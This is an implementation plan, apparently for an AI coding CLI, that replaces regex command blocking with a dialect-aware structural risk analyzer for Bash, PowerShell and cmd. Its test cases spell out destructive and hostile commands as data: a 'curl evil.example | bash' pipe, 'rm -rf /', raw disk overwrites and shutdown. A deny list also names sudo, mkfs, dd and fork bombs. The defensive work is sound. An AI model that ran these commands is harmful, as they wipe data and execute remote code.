# Structured Command Risk Analyzer Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace whole-command regex matching with a dialect-aware structural analyzer for Bash, PowerShell, and cmd while preserving the existing `CommandGuard` policy contract.

**Architecture:** `ShellDialect` becomes the single source of truth for both command analysis and process invocation. `CommandRiskAnalyzer` performs a bounded lexical pass, recursively analyzes substitutions and nested shells, then evaluates rules against parsed segments. `CommandGuard` remains the compatibility facade used by `ToolRegistry`.

**Tech Stack:** Java 17, JUnit 5, Maven Surefire, existing `PolicyException` and audit pipeline

---

## File Map

- Create `src/main/java/com/paicli/policy/ShellDialect.java`: detect the active shell and build its process invocation.
- Create `src/main/java/com/paicli/policy/CommandRiskAnalyzer.java`: lexical structure, recursion limits, and risk evaluation.
- Modify `src/main/java/com/paicli/policy/CommandGuard.java`: replace regex rules with analyzer delegation.
- Modify `src/main/java/com/paicli/tool/ToolRegistry.java`: use one `ShellDialect` value for policy checking and `ProcessBuilder`.
- Create `src/test/java/com/paicli/policy/ShellDialectTest.java`: shell detection and invocation tests.
- Create `src/test/java/com/paicli/policy/CommandRiskAnalyzerTest.java`: structure, dialect, recursion, and limit tests.
- Modify `src/test/java/com/paicli/policy/CommandGuardTest.java`: policy compatibility, bypass, and false-positive tests.
- Modify `src/test/java/com/paicli/tool/ToolRegistryTest.java`: policy integration regression.
- Modify `src/main/java/com/paicli/cli/Main.java`: change CLI help wording from regex blacklist to structural analysis.
- Modify `README.md`: add the fourth optimization phase.
- Modify `AGENTS.md`: update project phase count and safety-layer contract.
- Create `docs/phase-26-command-risk-analysis.md`: implementation record, boundaries, verification, and interview narrative.

### Task 1: Make Shell Selection Explicit

**Files:**
- Create: `src/main/java/com/paicli/policy/ShellDialect.java`
- Test: `src/test/java/com/paicli/policy/ShellDialectTest.java`

- [ ] **Step 1: Write failing shell detection tests**

```java
package com.paicli.policy;

import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;

class ShellDialectTest {

    @Test
    void detectsConfiguredShell() {
        assertEquals(ShellDialect.BASH, ShellDialect.detect("Linux", null));
        assertEquals(ShellDialect.POWERSHELL, ShellDialect.detect("Windows 11", null));
        assertEquals(ShellDialect.POWERSHELL, ShellDialect.detect("Windows 11", "powershell"));
        assertEquals(ShellDialect.CMD, ShellDialect.detect("Windows 11", "CMD"));
    }

    @Test
    void buildsMatchingInvocation() {
        assertEquals(List.of("bash", "-c", "pwd"), ShellDialect.BASH.invocation("pwd"));
        assertEquals(
                List.of("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "pwd"),
                ShellDialect.POWERSHELL.invocation("pwd"));
        assertEquals(List.of("cmd.exe", "/c", "dir"), ShellDialect.CMD.invocation("dir"));
    }
}
```

- [ ] **Step 2: Run the tests and verify RED**

Run:

```powershell
mvn -q -DskipTests=false -Dtest=ShellDialectTest test
```

Expected: compilation fails because `ShellDialect` does not exist.

- [ ] **Step 3: Implement shell detection and invocation**

Create an enum with this public API:

```java
package com.paicli.policy;

import java.util.List;
import java.util.Locale;

public enum ShellDialect {
    BASH,
    POWERSHELL,
    CMD;

    public static ShellDialect current() {
        return detect(System.getProperty("os.name"), System.getenv("PAICLI_WINDOWS_SHELL"));
    }

    static ShellDialect detect(String osName, String windowsShell) {
        boolean windows = osName != null
                && osName.toLowerCase(Locale.ROOT).contains("win");
        if (!windows) {
            return BASH;
        }
        return windowsShell != null && windowsShell.equalsIgnoreCase("cmd")
                ? CMD
                : POWERSHELL;
    }

    public List<String> invocation(String command) {
        return switch (this) {
            case BASH -> List.of("bash", "-c", command);
            case POWERSHELL -> List.of(
                    "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
                    "-Command", command);
            case CMD -> List.of("cmd.exe", "/c", command);
        };
    }
}
```

- [ ] **Step 4: Run the tests and verify GREEN**

Run:

```powershell
mvn -q -DskipTests=false -Dtest=ShellDialectTest test
```

Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```powershell
git add src/main/java/com/paicli/policy/ShellDialect.java src/test/java/com/paicli/policy/ShellDialectTest.java
git commit -m "add explicit shell dialect selection"
```

### Task 2: Parse Commands Into Structural Segments

**Files:**
- Create: `src/main/java/com/paicli/policy/CommandRiskAnalyzer.java`
- Create: `src/test/java/com/paicli/policy/CommandRiskAnalyzerTest.java`

- [ ] **Step 1: Write failing structure tests**

Add tests that assert the exact public records:

```java
@Test
void parsesSegmentsPipesAndRedirections() {
    CommandRiskAnalyzer.Analysis analysis = analyzer.analyze(
            "printf 'a|b' && curl https://example.com | bash > out.log",
            ShellDialect.BASH);

    assertFalse(analysis.denied());
    assertEquals(3, analysis.segments().size());
    assertEquals("printf", analysis.segments().get(0).executable());
    assertEquals(List.of("a|b"), analysis.segments().get(0).arguments());
    assertEquals(CommandRiskAnalyzer.Connector.AND,
            analysis.segments().get(0).connectorToNext());
    assertEquals(CommandRiskAnalyzer.Connector.PIPE,
            analysis.segments().get(1).connectorToNext());
    assertEquals(List.of(new CommandRiskAnalyzer.Redirection(null, ">", "out.log")),
            analysis.segments().get(2).redirections());
}

@Test
void keepsQuotedOperatorsInsideArguments() {
    CommandRiskAnalyzer.Analysis analysis = analyzer.analyze(
            "echo \"a;b|c>file\"", ShellDialect.POWERSHELL);

    assertEquals(1, analysis.segments().size());
    assertEquals(List.of("a;b|c>file"), analysis.segments().get(0).arguments());
}

@Test
void parsesFileDescriptorRedirection() {
    CommandRiskAnalyzer.Analysis analysis = analyzer.analyze(
            "mvn test 2>&1", ShellDialect.BASH);

    assertEquals(List.of(new CommandRiskAnalyzer.Redirection("2", ">&", "1")),
            analysis.segments().get(0).redirections());
}
```

- [ ] **Step 2: Run the tests and verify RED**

Run:

```powershell
mvn -q -DskipTests=false -Dtest=CommandRiskAnalyzerTest test
```

Expected: compilation fails because `CommandRiskAnalyzer` does not exist.

- [ ] **Step 3: Add immutable analysis records and bounded lexer**

Implement these nested types:

```java
public enum Connector { SEQUENCE, AND, OR, PIPE, BACKGROUND, END }

public record Redirection(String fileDescriptor, String operator, String target) {}

public record CommandSegment(
        String executable,
        List<String> arguments,
        List<Redirection> redirections,
        Connector connectorToNext,
        int pipelineIndex) {
    public CommandSegment {
        arguments = List.copyOf(arguments);
        redirections = List.copyOf(redirections);
    }
}

public record CommandRisk(String code, String reason) {}

public record Analysis(
        ShellDialect dialect,
        List<CommandSegment> segments,
        List<Analysis> nestedAnalyses,
        CommandRisk risk) {
    public Analysis {
        segments = List.copyOf(segments);
        nestedAnalyses = List.copyOf(nestedAnalyses);
    }

    public boolean denied() {
        return risk != null;
    }
}
```

Implement `analyze(String, ShellDialect)` with a private lexer that:

- tracks `NONE`, `SINGLE`, and `DOUBLE` quote state;
- uses `\` for Bash, backtick for PowerShell, and `^` for cmd escapes;
- emits `;`, newline, `&&`, `||`, `|`, and cmd/PowerShell single `&` as connectors outside quotes;
- emits `<`, `>`, `>>`, `<&`, and `>&` redirections with optional numeric file descriptors;
- binds the next word as the redirection target;
- rejects empty command operands, dangling connectors, missing redirection targets, and unclosed quotes;
- stops at 128 segments or 1,024 tokens with a `PARSE_LIMIT` risk.

Use these stable parse failure constructors:

```java
private static CommandRisk parseRisk(String detail) {
    return new CommandRisk("PARSE_ERROR", "命令结构无法可靠解析：" + detail);
}

private static CommandRisk limitRisk() {
    return new CommandRisk("PARSE_LIMIT", "命令结构超过安全分析上限");
}
```

No risk rule is evaluated in this task; structurally valid commands return `risk == null`.

- [ ] **Step 4: Run structure tests and verify GREEN**

Run:

```powershell
mvn -q -DskipTests=false -Dtest=CommandRiskAnalyzerTest test
```

Expected: all structure tests pass.

- [ ] **Step 5: Commit**

```powershell
git add src/main/java/com/paicli/policy/CommandRiskAnalyzer.java src/test/java/com/paicli/policy/CommandRiskAnalyzerTest.java
git commit -m "parse shell commands into structured segments"
```

### Task 3: Add Dialect Escapes and Recursive Commands

**Files:**
- Modify: `src/main/java/com/paicli/policy/CommandRiskAnalyzer.java`
- Modify: `src/test/java/com/paicli/policy/CommandRiskAnalyzerTest.java`

- [ ] **Step 1: Write failing dialect and recursion tests**

```java
@Test
void honorsDialectSpecificEscapes() {
    assertEquals(List.of("a;b"), analyzer.analyze(
            "echo a\\;b", ShellDialect.BASH).segments().get(0).arguments());
    assertEquals(List.of("a;b"), analyzer.analyze(
            "echo a`;b", ShellDialect.POWERSHELL).segments().get(0).arguments());
    assertEquals(List.of("a&b"), analyzer.analyze(
            "echo a^&b", ShellDialect.CMD).segments().get(0).arguments());
}

@Test
void recursivelyParsesSubstitutions() {
    CommandRiskAnalyzer.Analysis bash = analyzer.analyze(
            "echo $(pwd) `whoami`", ShellDialect.BASH);
    CommandRiskAnalyzer.Analysis powershell = analyzer.analyze(
            "Write-Output $(Get-Location)", ShellDialect.POWERSHELL);

    assertEquals(2, bash.nestedAnalyses().size());
    assertEquals("pwd", bash.nestedAnalyses().get(0).segments().get(0).executable());
    assertEquals(1, powershell.nestedAnalyses().size());
}

@Test
void recursivelyParsesExplicitShellLaunchers() {
    assertEquals("rm", analyzer.analyze(
            "bash -c \"rm -rf /\"", ShellDialect.BASH)
            .nestedAnalyses().get(0).segments().get(0).executable());
    assertEquals("shutdown", analyzer.analyze(
            "powershell -Command \"shutdown /s\"", ShellDialect.POWERSHELL)
            .nestedAnalyses().get(0).segments().get(0).executable());
    assertEquals("shutdown", analyzer.analyze(
            "cmd /c \"shutdown /s\"", ShellDialect.CMD)
            .nestedAnalyses().get(0).segments().get(0).executable());
}

@Test
void rejectsUnclosedSubstitutionAndRecursionOverflow() {
    assertEquals("PARSE_ERROR", analyzer.analyze(
            "echo $(pwd", ShellDialect.BASH).risk().code());
    String nested = "pwd";
    for (int i = 0; i < 14; i++) {
        nested = "$(" + nested + ")";
    }
    assertEquals("PARSE_LIMIT", analyzer.analyze(
            "echo " + nested, ShellDialect.BASH).risk().code());
}
```

- [ ] **Step 2: Run the focused tests and verify RED**

Run:

```powershell
mvn -q -DskipTests=false -Dtest=CommandRiskAnalyzerTest test
```

Expected: substitution and nested-shell assertions fail.

- [ ] **Step 3: Implement substitution extraction and recursion**

Add:

```java
private static final int MAX_RECURSION_DEPTH = 12;
```

Route the public method through a depth-aware overload:

```java
public Analysis analyze(String command, ShellDialect dialect) {
    ShellDialect actualDialect = dialect == null ? ShellDialect.current() : dialect;
    return analyze(command == null ? "" : command, actualDialect, 0);
}
```

The private overload must:

1. Return `PARSE_LIMIT` when `depth > MAX_RECURSION_DEPTH`.
2. Extract balanced `$()` outside single quotes and recursively analyze its content in the current dialect.
3. In Bash only, extract unescaped backtick content as a nested Bash command.
4. After top-level parsing, inspect every segment for:
   - `sh`, `bash`, `zsh`, `fish`, `ksh` followed by `-c`;
   - `powershell`, `pwsh` followed by `-Command` or `-c`;
   - `cmd` followed by `/c`.
5. Recursively analyze the argument after the launcher option using the launched shell's dialect.
6. Propagate the first nested parse risk to the parent analysis.

Nested extraction must honor the active quote and escape rules and must not treat PowerShell's backtick as command substitution.

- [ ] **Step 4: Run analyzer tests and verify GREEN**

Run:

```powershell
mvn -q -DskipTests=false -Dtest=CommandRiskAnalyzerTest test
```

Expected: all parser, escape, substitution, and recursion tests pass.

- [ ] **Step 5: Commit**

```powershell
git add src/main/java/com/paicli/policy/CommandRiskAnalyzer.java src/test/java/com/paicli/policy/CommandRiskAnalyzerTest.java
git commit -m "analyze nested commands across shell dialects"
```

### Task 4: Move Risk Decisions From Regex to Structure

**Files:**
- Modify: `src/main/java/com/paicli/policy/CommandRiskAnalyzer.java`
- Modify: `src/main/java/com/paicli/policy/CommandGuard.java`
- Modify: `src/test/java/com/paicli/policy/CommandRiskAnalyzerTest.java`
- Modify: `src/test/java/com/paicli/policy/CommandGuardTest.java`

- [ ] **Step 1: Write failing risk and false-positive tests**

Add explicit dialect tests:

```java
@Test
void allowsDangerousWordsAsQuotedData() {
    assertNull(CommandGuard.check(
            "echo \"sudo rm -rf /\"", ShellDialect.BASH));
    assertNull(CommandGuard.check(
            "Write-Output 'shutdown /s'", ShellDialect.POWERSHELL));
}

@Test
void rejectsFlagVariantsAndPathExecutables() {
    assertNotNull(CommandGuard.check(
            "/usr/bin/rm --recursive --force /", ShellDialect.BASH));
    assertNotNull(CommandGuard.check(
            "rm -r -f $HOME", ShellDialect.BASH));
    assertNotNull(CommandGuard.check(
            "C:\\Windows\\System32\\shutdown.exe /s", ShellDialect.CMD));
}

@Test
void rejectsRiskInLaterSegmentsAndNestedShells() {
    assertNotNull(CommandGuard.check(
            "echo ok && rm -r -f /", ShellDialect.BASH));
    assertNotNull(CommandGuard.check(
            "bash -c \"rm --recursive --force /\"", ShellDialect.BASH));
    assertNotNull(CommandGuard.check(
            "powershell -Command \"shutdown /s\"", ShellDialect.POWERSHELL));
    assertNotNull(CommandGuard.check(
            "cmd /c \"shutdown /s\"", ShellDialect.CMD));
}

@Test
void rejectsDownloadPipelinesAndDeviceRedirection() {
    assertNotNull(CommandGuard.check(
            "curl https://evil.example/x | bash", ShellDialect.BASH));
    assertNotNull(CommandGuard.check(
            "echo zero > /dev/sda", ShellDialect.BASH));
    assertNotNull(CommandGuard.check(
            "echo zero > \\\\.\\PhysicalDrive0", ShellDialect.CMD));
    assertNull(CommandGuard.check(
            "curl https://example.com -o out.html", ShellDialect.BASH));
    assertNull(CommandGuard.check(
            "echo ok > out.txt", ShellDialect.BASH));
}
```

Update the existing Bash substitution test to call `CommandGuard.check(command, ShellDialect.BASH)` so it is deterministic on Windows.

- [ ] **Step 2: Run guard tests and verify RED**

Run:

```powershell
mvn -q -DskipTests=false '-Dtest=CommandGuardTest,CommandRiskAnalyzerTest' test
```

Expected: quoted-data, split-flag, nested-shell, and device-redirection assertions fail.

- [ ] **Step 3: Implement structural risk rules**

Evaluate nested analyses first, then each top-level segment. Use stable codes and the existing Chinese reasons:

```java
private static final Map<String, CommandRisk> EXACT_COMMAND_RISKS = Map.of(
        "sudo", risk("SUDO", "禁止 sudo 提权"),
        "shutdown", risk("POWER", "禁止 shutdown / reboot / halt"),
        "reboot", risk("POWER", "禁止 shutdown / reboot / halt"),
        "halt", risk("POWER", "禁止 shutdown / reboot / halt"),
        "poweroff", risk("POWER", "禁止 shutdown / reboot / halt"));
```

Add focused helpers:

```java
private String normalizeExecutable(String executable)
private CommandRisk evaluateSegment(CommandSegment segment, List<CommandSegment> all)
private boolean hasRmRecursiveFlag(List<String> arguments)
private boolean hasRmForceFlag(List<String> arguments)
private boolean isBroadTarget(String value)
private boolean isRawDevice(String value)
private boolean isDownloadToShellPipeline(CommandSegment source, CommandSegment target)
private boolean isForkBomb(String command)
```

Required behavior:

- normalize slash/backslash paths and remove `.exe`, `.cmd`, and `.bat`;
- detect separate, combined, and long `rm` flags;
- detect `mkfs` and `mkfs.*`;
- detect `dd` arguments whose normalized key is `of` and value starts with `/dev/`;
- detect the canonical fork-bomb token sequence after removing unquoted whitespace;
- detect `curl`/`wget` piped to `sh`, `bash`, `zsh`, `fish`, or `ksh`;
- detect `find` broad targets;
- detect recursive `chmod 777` broad targets;
- detect output redirection to `/dev/sd*`, `/dev/nvme*`, `/dev/mmcblk*`, or `\\.\PhysicalDrive*`;
- return the first risk in source order.

- [ ] **Step 4: Replace `CommandGuard` regex rules with delegation**

The class must retain the old method and add an explicit dialect overload:

```java
public final class CommandGuard {
    private static final CommandRiskAnalyzer ANALYZER = new CommandRiskAnalyzer();

    private CommandGuard() {
    }

    public static String check(String command) {
        return check(command, ShellDialect.current());
    }

    public static String check(String command, ShellDialect dialect) {
        if (command == null || command.isBlank()) {
            return null;
        }
        CommandRiskAnalyzer.Analysis analysis = ANALYZER.analyze(command, dialect);
        return analysis.risk() == null ? null : analysis.risk().reason();
    }
}
```

Update its class comment to state that this is a bounded structural auxiliary defense, not a full Shell parser or sandbox.

- [ ] **Step 5: Run policy tests and verify GREEN**

Run:

```powershell
mvn -q -DskipTests=false '-Dtest=CommandGuardTest,CommandRiskAnalyzerTest' test
```

Expected: all policy and analyzer tests pass, including every pre-existing `CommandGuardTest`.

- [ ] **Step 6: Commit**

```powershell
git add src/main/java/com/paicli/policy/CommandRiskAnalyzer.java src/main/java/com/paicli/policy/CommandGuard.java src/test/java/com/paicli/policy/CommandRiskAnalyzerTest.java src/test/java/com/paicli/policy/CommandGuardTest.java
git commit -m "replace command regexes with structural risk rules"
```

### Task 5: Use One Dialect for Guarding and Execution

**Files:**
- Modify: `src/main/java/com/paicli/tool/ToolRegistry.java`
- Modify: `src/test/java/com/paicli/tool/ToolRegistryTest.java`

- [ ] **Step 1: Add a failing integration regression**

```java
@Test
void shouldAllowQuotedRiskWordsButRejectStructuredRisk() {
    ToolRegistry registry = new ToolRegistry();

    String quoted = registry.executeTool(
            "execute_command",
            "{\"command\":\"echo \\\"sudo rm -rf /\\\"\"}");
    String chained = registry.executeTool(
            "execute_command",
            "{\"command\":\"echo ok && shutdown /s\"}");

    assertFalse(quoted.contains("策略拒绝"));
    assertTrue(chained.contains("策略拒绝"));
}
```

Use a command form valid in the test host's active dialect. Keep this test focused on policy output; existing tests already cover actual process execution and audit formatting.

- [ ] **Step 2: Run the integration test and verify RED**

Run:

```powershell
mvn -q -DskipTests=false -Dtest=ToolRegistryTest#shouldAllowQuotedRiskWordsButRejectStructuredRisk test
```

Expected: the quoted command is rejected by the old whole-string regex guard.

- [ ] **Step 3: Wire one dialect value through both paths**

Change `executeCommand` to compute once:

```java
ShellDialect dialect = ShellDialect.current();
String denyReason = CommandGuard.check(normalized, dialect);
```

Change process creation to:

```java
ProcessBuilder pb = new ProcessBuilder(dialect.invocation(normalized));
```

Remove `shellCommand(String)` and `isWindows()` from `ToolRegistry`, and add the `ShellDialect` import. The analyzed command and executed command must remain the same unmodified `normalized` string.

- [ ] **Step 4: Run integration and safety suites**

Run:

```powershell
mvn -q -DskipTests=false '-Dtest=ToolRegistryTest,CommandGuardTest,CommandRiskAnalyzerTest,ShellDialectTest,ApprovalPolicyTest,AuditLogTest' test
```

Expected: all selected suites pass.

- [ ] **Step 5: Commit**

```powershell
git add src/main/java/com/paicli/tool/ToolRegistry.java src/test/java/com/paicli/tool/ToolRegistryTest.java
git commit -m "share shell dialect between policy and execution"
```

### Task 6: Document, Verify, and Publish the Fourth Phase

**Files:**
- Modify: `src/main/java/com/paicli/cli/Main.java`
- Modify: `README.md`
- Modify: `AGENTS.md`
- Create: `docs/phase-26-command-risk-analysis.md`

- [ ] **Step 1: Update user-facing safety wording**

Change the CLI help line from:

```java
out.println("   命令黑名单: sudo / rm -rf 全盘 / mkfs / dd of=/dev / fork bomb / curl|sh / find / / chmod 777 / / shutdown");
```

to:

```java
out.println("   命令风险分析: 按 Shell 结构识别高危命令、参数、管道、重定向与命令替换");
```

- [ ] **Step 2: Add the fourth phase to repository documentation**

Add a `### 第四期优化：结构化命令风险分析` section to `README.md` after the third phase. It must state:

- Bash、PowerShell、cmd share one dialect-aware entry.
- Segments, arguments, pipes, redirections, substitutions, and nested shells are analyzed.
- Quoted text is distinguished from executable structure.
- The analyzer remains an auxiliary defense alongside HITL, not a sandbox.
- Link to `docs/phase-26-command-risk-analysis.md`.

Update `AGENTS.md`:

- delivered phase count from 25 to 26;
- append structured command risk analysis to the delivered phase list;
- replace “CommandGuard 是辅助黑名单” with “CommandGuard 委托 CommandRiskAnalyzer 做有界结构化分析，仍是辅助防线而非沙箱”;
- add `mvn test -Dtest=CommandRiskAnalyzerTest,CommandGuardTest,ToolRegistryTest` to the policy verification guidance.

- [ ] **Step 3: Write the implementation record**

Create `docs/phase-26-command-risk-analysis.md` with these complete sections:

1. 背景与问题：whole-command regex false positives and bypasses.
2. 已实现架构：`ShellDialect -> CommandRiskAnalyzer -> CommandGuard -> ToolRegistry`.
3. 结构模型：segments, connectors, arguments, redirections, nested analyses, risk.
4. 三种方言差异：quotes and escapes.
5. 风险规则 and stable reasons.
6. 安全边界：no variable expansion, aliases, profiles, script-body inspection, or sandboxing.
7. 测试矩阵 and exact Maven commands.
8. 面试讲解：why no third-party POSIX-only parser, complexity `O(n)`, bounded recursion, fail-closed parse errors, and preserving original execution text.

- [ ] **Step 4: Run focused tests**

Run:

```powershell
mvn -q -DskipTests=false '-Dtest=ShellDialectTest,CommandRiskAnalyzerTest,CommandGuardTest' test
mvn -q -DskipTests=false '-Dtest=ToolRegistryTest#shouldAllowQuotedRiskWordsButRejectStructuredRisk+shouldRejectBroadFilesystemScan+shouldRunCommandInProjectDirectory' test
```

Expected: all focused tests pass.

- [ ] **Step 5: Run the full suite**

Run:

```powershell
mvn -q -DskipTests=false test
```

Expected: command-risk tests remain green. Compare any unrelated Windows failures with the recorded pre-change baseline instead of attributing them to this task.

- [ ] **Step 6: Build the runnable JAR**

Run:

```powershell
mvn -q -DskipTests package
```

Expected: exit code 0 and `target/paicli-1.0-SNAPSHOT.jar` exists.

- [ ] **Step 7: Run CLI smoke verification**

Run:

```powershell
$env:GLM_API_KEY='smoke-test'
java -jar target/paicli-1.0-SNAPSHOT.jar
# Wait for the PaiCLI prompt, then enter /exit.
```

Expected: PaiCLI prints the banner and interactive prompt, then `/exit` terminates normally.

- [ ] **Step 8: Check diff hygiene**

Run:

```powershell
git diff --check
git status --short
```

Expected: no whitespace errors; only command-risk implementation and documentation files are tracked changes. Pre-existing untracked `docs/assets/` remains outside the commit.

- [ ] **Step 9: Commit implementation documentation**

```powershell
git add src/main/java/com/paicli/cli/Main.java README.md AGENTS.md docs/phase-26-command-risk-analysis.md
git commit -m "document structured command safety phase"
```

- [ ] **Step 10: Review commits and push**

Run:

```powershell
git log --oneline origin/main..HEAD
git status --short
git push origin main
```

Expected: the design, plan, implementation, integration, and documentation commits are pushed to `huaixinsi/huaixinsi-AgentCli`; `docs/assets/` is still not included.

## Self-Review

- Spec coverage: Tasks 1-5 cover all parser, dialect, recursion, policy, compatibility, and integration requirements; Task 6 covers documentation and every verification criterion.
- Placeholder scan: every implementation step names concrete behavior, code, and verification.
- Type consistency: all tasks use `ShellDialect`, `CommandRiskAnalyzer.Analysis`, `CommandSegment`, `Redirection`, `Connector`, and `CommandRisk` with the same names and method signatures.
- Scope: the plan adds no parser dependency, does not rewrite commands, and does not claim sandbox-level protection.
